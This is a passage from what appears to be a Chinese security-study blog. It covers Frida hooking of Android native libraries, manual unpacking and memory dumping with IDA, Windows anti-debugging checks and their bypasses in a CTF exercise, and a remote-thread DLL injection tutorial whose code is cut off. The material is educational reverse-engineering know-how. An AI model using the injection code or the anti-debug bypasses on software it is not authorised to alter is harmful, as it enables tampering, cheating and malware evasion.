<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">const</span> runtimeClass = Java.use(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line"><span class="comment">//hook java层加载so的函数</span></span><br><span class="line">runtimeClass.nativeLoad.overload(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>,<span class="string">&#x27;java.lang.Class&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,p3</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> res = <span class="built_in">this</span>.nativeLoad(p1,p2,p3)</span><br><span class="line">    <span class="comment">//找到</span></span><br><span class="line">    <span class="keyword">if</span>(p1.indexOf(<span class="string">&#x27;your_so.so&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//hook so层函数</span></span><br><span class="line">            Interceptor.attach( Module.findExportByName(<span class="string">&#x27;your_so.so&#x27;</span>,<span class="string">&#x27;FuncName&#x27;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="function"><span class="title">onEnter</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> size = args[<span class="number">2</span>].add(<span class="number">0x4</span>).readu32()	</span><br><span class="line">                <span class="keyword">let</span> data = args[<span class="number">2</span>].readPointer().readByteArray(size)</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">let</span> file = <span class="keyword">new</span> File(<span class="string">&#x27;/sdcard/&#x27;</span> + size + <span class="string">&#x27;.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">                file.write(data)</span><br><span class="line">                file.flush()</span><br><span class="line">                file.close()</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="function"><span class="title">onLeave</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>第二种找到so内目标函数的方法是，没有export的情况，需要用偏移量来进行寻址,在attach函数调用的那一步，改写为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> so = Process.findModuleByName(<span class="string">&#x27;your_so.so&#x27;</span>)</span><br><span class="line">Interceptor.attach( so.add(offset) &#123;<span class="comment">/*回调内容*/</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>在IDA逆so的时候，设置segement为0，可以定位函数的地址直接为偏移量；</p>
<p>arm汇编中，函数传参使用r0~r4；</p>
</div></div><a class="button-hover more" href="/SecondBC/2023/04/11/Frida%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2023/03/16/Windows%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%9F%BA%E7%A1%80/">Windows逆向之脱壳与反调试 基础</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2023-03-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Reverse/">Reverse</a></div></div><div class="post-content"><div class="main-content content"><p>详细请见 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/reverse/introduction/">wiki</a> ；</p>
<h2 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h2><p>之前已经讲过其概念；这里更多的是脱壳的一些技巧，记录练手；</p>
<p>更多术语名词在之前提及过；</p>
<h3 id="单步跟踪法"><a href="#单步跟踪法" class="headerlink" title="单步跟踪法"></a>单步跟踪法</h3><blockquote>
<p>单步跟踪法的原理就是通过步过 (F8), 步入(F7) 和运行到 (F4) 功能, 完整走过程序的自脱壳过程, 跳过一些循环恢复代码的片段, 并用单步进入确保程序不会略过 OEP. 这样可以在软件自动脱壳模块运行完毕后, 到达 OEP, 并 dump 程序.</p>
</blockquote>
<p>要点： </p>
<ol>
<li>打开程序按 F8 单步向下, 尽量实现向下的 jmp 跳转；</li>
<li>会经常遇到大的循环, 这时要多用 F4 来跳过循环；</li>
<li>如果函数载入时不远处就是一个 call(<strong>近 call</strong>), 那么我们尽量不要直接跳过, 而是进入这个 call；</li>
<li>一般<strong>跳转幅度大</strong>的 jmp 指令, 都极有可能是跳转到了原程序入口点 (OEP)；</li>
</ol>
<p>用题举例：</p>
<p>打开后即是一个加壳文件，并有着 pusha 指令；</p>
<p>直接挂在开始处启动调试；</p>
<p>像图一的这种call就叫近call（基本上这个函数里只有几句话加1个call）；</p>
<p>中间图的内容是跟进到找不到近call后可以看到这一系列的call在调用windows api，什么Module，ProcAddress一类的；</p>
<p>再往下走就能进入一个解码循环中，最后的通路在经过一番绕之后发现在 40D15F 这个地址；</p>
<p><img src="https://s2.loli.net/2023/03/14/D7FTufLkgnNtZ3z.png" alt="debug"></p>
<p>继续往下走.. 之后还会有些循环，在这些循环中，向下跳的指令如果没有判断执行，很可能就是这条路，如左图所示；</p>
<p>跳过之后能发现 popa 指令，这与 pusha 相对应，回复其寄存器状态；</p>
<p>跳转到对应函数后，有push指令和retn，意思是将该十六进制内容压入栈中，并利用这个数据，返回到此十六进制地址；这便是此程序的OEP（从D000变到1000，跳转很明显）；</p>
<p><img src="https://s2.loli.net/2023/03/14/oKHNXcAEaP5ZCvG.png" alt="find"></p>
<h3 id="ESP定律法"><a href="#ESP定律法" class="headerlink" title="ESP定律法"></a>ESP定律法</h3><blockquote>
<p>ESP 定律的原理在于利用程序中堆栈平衡来快速找到 OEP.</p>
<p>由于在程序自解密或者自解压过程中, 不少壳会先将当前寄存器状态压栈, 如使用<code>pushad</code>, 在解压结束后, 会将之前的寄存器值出栈, 如使用<code>popad</code>. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发. 然后在程序当前位置, 只需要少许单步操作, 就很容易到达正确的 OEP 位置.</p>
</blockquote>
<p>简单来讲，在执行 pushad 之后， esp会确定下来，在 popad 执行后，也是此时的esp值，在此时esp栈上打个内存断点，则可检测两次esp同值时的时刻，第二次便是 popad 执行时；</p>
<p>要点：</p>
<ol>
<li>程序刚载入开始 pushad/pushfd；</li>
<li>将全部寄存器压栈后就设<strong>对 ESP 寄存器设硬件断点</strong>；</li>
<li>运行程序, 触发断点；</li>
<li>删除硬件断点开始分析；</li>
</ol>
<p>用题举例：</p>
<p>还是之前的那个程序：</p>
<p><img src="https://s2.loli.net/2023/03/14/Aek98FthWrYKmHs.png" alt="breakpoint"></p>
<p>执行后打开此时esp的栈中位置，打上断点，F4执行，会弹出一个硬件断点被捕获的窗口，点击后可以看到来到了上次 popa 执行之后的地方；</p>
<p>这个方法非常好用；</p>
<h3 id="一步到达OEP法"><a href="#一步到达OEP法" class="headerlink" title="一步到达OEP法"></a>一步到达OEP法</h3><p>说白了就是搜索 text 为 popad 之类的东西，然后查看其结构是不是壳的转到OEP位置的地方，然后直接在这个地方断点，直接过去；</p>
<p>只能说，能用的壳比较有限；一般 转到OEP处的 jmp 指令 跳转会比较大；</p>
<h3 id="内存dump"><a href="#内存dump" class="headerlink" title="内存dump"></a>内存dump</h3><p>找到OEP后，即可dump出脱壳后的程序：</p>
<p>点击 IDA 的 file &gt; script command &gt; 写入脚本并用 IDC 运行；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">  fp = fopen(<span class="string">&quot;your\\dumped\\file\\path&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  begin = r0;		<span class="comment">//OEP位置</span></span><br><span class="line">  end = r0 + r1;	<span class="comment">//r1为大小，一般填90000</span></span><br><span class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</span><br><span class="line">      fputc(Byte(dexbyte), fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>wiki上基本上都是说明，实际操作会来的更少，不过能了解一下，也能为后期搞反调试带来些许帮助；</p>
<h3 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h3><p>原理：</p>
<p>在 32 位机器上, <code>NtGlobalFlag</code>字段位于<code>PEB</code>(进程环境块)<code>0x68</code>的偏移处, 64 位机器则是在偏移<code>0xBC</code>位置. 该字段的默认值为 0. 当调试器正在运行时, 该字段会被设置为一个特定的值，一般是0x70；</p>
<p>该字段包含有一系列的标志位. 由调试器创建的进程会设置以下标志位:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLG_HEAP_ENABLE_TAIL_CHECK (0x10)</span><br><span class="line">FLG_HEAP_ENABLE_FREE_CHECK (0x20)</span><br><span class="line">FLG_HEAP_VALIDATE_PARAMETERS (0x40)</span><br></pre></td></tr></table></figure>

<p>检测其值就能判断是否处于调试中；</p>
<p>PEB结构在汇编中加入的形式是经典的 fs:30h 段寄存器偏移；</p>
<p>这时候在PEB结构上往下偏移并找到 NtGlobalFlag；</p>
<p>之后检测；</p>
<p>如下为32位系统的 debug 检测：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ;Process Environment Block</span><br><span class="line">mov al, [eax+68h] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure>

<p>64位中， PEB结构加入形式是 gs:lodsq，也是加到eax寄存器中；</p>
<p>绕过的核心思想：</p>
<p>在eip指向 <code>mov al, [eax+68h]</code> 找到其内存位置并重新修改其值为 0.</p>
<p>对于修改 NtGlobalFlag 初值可以用注册表，这里不详细说明；</p>
<h3 id="Heap-Flags"><a href="#Heap-Flags" class="headerlink" title="Heap Flags"></a>Heap Flags</h3><p><code>Heap flags</code>包含有两个与<code>NtGlobalFlag</code>一起初始化的标志: <code>Flags</code>和<code>ForceFlags</code>. 这两个字段的值不仅会受调试器的影响, 还会由 windows 版本而不同, 字段的位置也取决于 windows 的版本.</p>
<blockquote>
<ul>
<li>Flags 字段:<ul>
<li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>Flags</code>位于堆的<code>0x0C</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x40</code>偏移处.</li>
<li>在 64 位 Windows XP 中, <code>Flags</code>字段位于堆的<code>0x14</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x70</code>偏移处.</li>
</ul>
</li>
<li>ForceFlags 字段:<ul>
<li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>ForceFlags</code>位于堆的<code>0x10</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x44</code>偏移处.</li>
<li>在 64 位 Windows XP 中, <code>ForceFlags</code>字段位于堆的<code>0x18</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x74</code>偏移处.</li>
</ul>
</li>
</ul>
</blockquote>
<p>一般而言，NtGlobalFlag 设置后，Heap Flags 也会设置；</p>
<p>调试器存在则：</p>
<p>Flags字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HEAP_GROWABLE (2)</span><br><span class="line">HEAP_TAIL_CHECKING_ENABLED (0x20)</span><br><span class="line">HEAP_FREE_CHECKING_ENABLED (0x40)</span><br><span class="line">HEAP_SKIP_VALIDATION_CHECKS (0x10000000)	</span><br><span class="line">HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)</span><br></pre></td></tr></table></figure>

<p>ForgeFlags：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HEAP_TAIL_CHECKING_ENABLED (0x20)</span><br><span class="line">HEAP_FREE_CHECKING_ENABLED (0x40)</span><br><span class="line">HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)</span><br></pre></td></tr></table></figure>



<h4 id="获取heap位置："><a href="#获取heap位置：" class="headerlink" title="获取heap位置："></a>获取heap位置：</h4><p>kernel32中的 GetProcessHeap()；</p>
<p>PEB结构中查找，同样，一般动用fs，gs段寄存器就很容易是搞PEB的；</p>
<h3 id="The-Heap"><a href="#The-Heap" class="headerlink" title="The Heap"></a>The Heap</h3><p>堆在初始化时，会检查 heap flags；</p>
<p>设置 tail checking enable （尾部检测），那么会分配 0xABABABAB 给堆块尾；</p>
<p>设置 free checking enbale  ，那么当需要额外字节填充堆块，会用 0xFEEEFEEE；</p>
<p>那么检测这些字节，可以得知是否在被调试，避免了动PEB的经典形象；</p>
<p>首先要先知道堆指针，且现代程序堆都会加密；</p>
<h3 id="Int-3"><a href="#Int-3" class="headerlink" title="Int 3"></a>Int 3</h3><p>无论何时触发了一个软件中断异常, 异常地址以及 EIP 寄存器的值都会同时指向产生异常的下一句指令. 但断点异常是其中的一个特例.</p>
<p>当<code>EXCEPTION_BREAKPOINT(0x80000003)</code>异常触发时, Windows 会认定这是由单字节的 “<code>CC</code>“ 操作码 (也即<code>Int 3</code>指令) 造成的. Windows 递减异常地址以指向所认定的 “<code>CC</code>“ 操作码, 随后传递该异常给异常处理句柄. 但是 EIP 寄存器的值并不会发生变化.</p>
<p>因此, 如果使用了 <code>CD 03</code>（这是 <code>Int 03</code> 的机器码表示），那么当异常处理句柄接受控制时, 异常地址是指向 <code>03</code> 的位置.</p>
<h3 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h3><p>这个是典中典；</p>
<p>没调试的时候，返回的就是0；</p>
<p>实际上这个函数只是返回了 BeingDebugged 标志的值，也是PEB结构中的内容；</p>
<p>绕过：hook函数，或者改PEB表；</p>
<h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h3><p>存在于kernel32中，检测指定的进程的调试状态；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">CheckRemoteDebuggerPresent</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  _Inout_ PBOOL  pbDebuggerPresent</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在被调试的时候，会将第二个参数指向的值变为0xffffffff；</p>
<p>简单的绕过只是将第二个参数的值在执行该函数后改变为0；</p>
<p>而这个函数本质是在对NtQueryInformationProcess的使用；</p>
<h3 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NtQueryInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      HANDLE           ProcessHandle,					<span class="comment">//进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      PROCESSINFOCLASS ProcessInformationClass,		<span class="comment">//信息类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_     PVOID            ProcessInformation,			<span class="comment">//写入信息缓冲区</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      ULONG            ProcessInformationLength,		<span class="comment">//缓冲区大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_opt_ PULONG           ReturnLength				</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>在第二个参数中，有一个信息类型叫做： ProcessDebugPort；宏为7；</p>
<p>此时该函数通过查询<code>EPROCESS</code>结构体的<code>DebugPort</code>字段, 当进程正在被调试时, 返回值为<code>0xffffffff</code>；</p>
<h3 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h3><p>这个函数给线程设置信息，可以设置：ThreadHideFromDebugger，禁止线程调试；</p>
<p>处于调试状态，执行完：<code>ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0)</code> ，程序就会退出；</p>
<p>绕过：</p>
<p>ThreadHideFromDebugger，宏为0x11，如果看见这个函数，且有参数0x11，改之即可；</p>
<h3 id="练习题："><a href="#练习题：" class="headerlink" title="练习题："></a>练习题：</h3><p>一开始让输入password，进IDA之后就发现，密码就是很简单的 “I have a pen.”，在原程序里输入确实输出了 “correct”；但后面为何有这么多调试检测？这说明这道题的flag是需要通过调试查找的；</p>
<p>首先的关卡是 IsDebuggerPresent() ，以及NtGlobalFlag；</p>
<p><img src="https://s2.loli.net/2023/03/16/d9iOenU4oTr8twJ.png" alt="first"></p>
<p>简单的对策便是 patch 右上图 1 为 0，右下图 70h 为 2 * 70h；</p>
<p>接下来遇到的是查看进程调试以及时间差；</p>
<p><img src="https://s2.loli.net/2023/03/16/m3aAUywoL9dJbTi.png" alt="second"></p>
<p>首先改写 jz 为 jnz；</p>
<p>之后GetTickCount返回一个距离程序开始的时间，中间的图是一个sleep循环；最后比较1000；</p>
<p>这里只需简单粗暴改jbe为jmp；</p>
<p>接下来就是判断 process monitor 以及进程名，和是否虚拟机；</p>
<p>具体思想也是改值；</p>
<p>真实题里，这些反调试函数大大小小也是会比较的，但会有混淆，或者藏于线程，TLS等中去，更难发现；</p>
<p>而一般的题，确实大可不必去hook API，除非是线程里循环检测的反调试，一开就G的那种，但其实也可以静态patch；</p>
<p>还有那种判断过后卡几个call再G的反调试，真真的恶心人；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>熟悉了下手脱壳以及ida的 dump内存；熟悉硬件断点的使用；知晓一些简单的反调试原理；</p>
<p>感觉反调试原理大多与 PEB 结构有关系；所以接下来会考虑 开坑 PEB；</p>
</div></div><a class="button-hover more" href="/SecondBC/2023/03/16/Windows%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%9F%BA%E7%A1%80/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/12/12/DLL%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK/">DLL注入与HOOK</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-12-12</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Bin/">Bin</a></div></div><div class="post-content"><div class="main-content content"><p>首先啊，首先啊；</p>
<p>你得了解windows编程及其基于消息的处理机制，DllMain函数；</p>
<p>不然就会看不懂或者啃着异常难受核心原理第三章；</p>
<h2 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h2><p>dll为文件后缀名，称为dynamic link library，动态链接库，一般用于存储方法和函数，进程运行时动态地调用其函数；</p>
<p>其显示调用命令为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LoadLibrary</span>(<span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>dll注入，顾名思义，将已有进程，使其调用不属于它本身的dll文件，称为dll注入；</p>
<p>一般用于对已经做好的软件进行升级扩展和修补漏洞，也可用于外挂；</p>
<h3 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h3><p>根据dll注入的本意，很轻易的可以想到通过创建远程进程的子线程对其进行 LoadLibrary 操作；</p>
<p>利用windows API，于是有以下操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开进程</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建进程中的线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, ThreadProc, dll_path, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>其中，ThreadProc 是线程回调函数，也就是线程内容，可以在其中执行 LoadLibrary；</p>
<p>但由于其特殊性，该回调函数的特征类似于LoadLibrary函数，都只有一个参数，而且类型可以说是一样的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPVOID lpParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibrary</span></span><br><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>所以创建线程可以写成如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, dll_path, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>但有个问题？这里的dll_path传参数是本进程的地址，如果直接这么用，那么目标进程执行时，就会造成调用越界出错；</p>
<p>所以需要dll_path写入目标进程，用windows API 实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[] = <span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>;</span><br><span class="line">SIZE_T bufferSize = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line">SIZE_T realWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//申请进程内存空间</span></span><br><span class="line"><span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, bufferSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;malloc err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将字符串写入该空间</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, str, buffer, bufferSize, &amp;realWrite);</span><br></pre></td></tr></table></figure>

<p>之后再用str去创建线程传参，就没有问题了；</p>
<p>完整代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = <span class="string">&quot;your aim pid&quot;</span>;</span><br><span class="line">	<span class="comment">//打开进程</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;open fail !! &quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> buffer[] = <span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>;</span><br><span class="line">	SIZE_T bufferSize = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line">	SIZE_T realWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//申请进程内存空间</span></span><br><span class="line">	<span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, bufferSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;malloc err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//将字符串写入该空间</span></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, str, buffer, bufferSize, &amp;realWrite);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建进程中的线程</span></span><br><span class="line">	HANDLE hThread = <span 